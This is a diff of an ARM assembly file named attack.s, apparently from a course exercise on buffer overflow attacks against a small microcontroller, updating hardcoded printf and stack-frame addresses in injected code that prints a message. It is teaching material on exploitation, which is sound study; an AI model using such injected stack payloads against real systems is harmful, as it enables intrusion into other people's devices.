@@ -1,14 +1,14 @@
 @@@ x1500-hack/attack.s
 @@@ Copyright (c) J. M. Spivey 2020
-        
+	
         .syntax unified
 
-        .equ printf, 0x00000510 @ Address of printf
-        .equ frame, 0x2001ffc0  @ Captured stack pointer value in init
+	.equ printf, 0x00000544 @ Address of printf
+	.equ frame, 0x2001efa0  @ Captured stack pointer value in init
 
-        .text
+	.text
 attack:
-        sub sp, #56             @  0: Reserve stack space again
+	sub sp, #56             @  0: Reserve stack space again
 again:
         adr r0, message         @  2: Address of our message
         ldr r1, =printf+1       @  4: Absolute address for call
